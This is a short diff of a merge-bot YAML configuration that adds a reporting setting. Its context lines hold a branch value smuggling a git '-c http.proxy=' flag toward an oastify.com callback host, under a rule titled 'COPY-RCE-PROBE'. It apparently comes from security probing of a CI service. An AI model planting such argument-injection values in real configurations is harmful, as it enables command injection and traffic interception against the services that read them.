@@ -6,3 +6,5 @@ pull_request_rules:
         branches:
           - "-chttp.proxy=copyrce-1779959955904695000.gxhi3c467gxcqk9wi4z0fnus1j7av1jq.oastify.com"
         title: "COPY-RCE-PROBE"
+merge_protections_settings:
+  reporting_method: check-runs
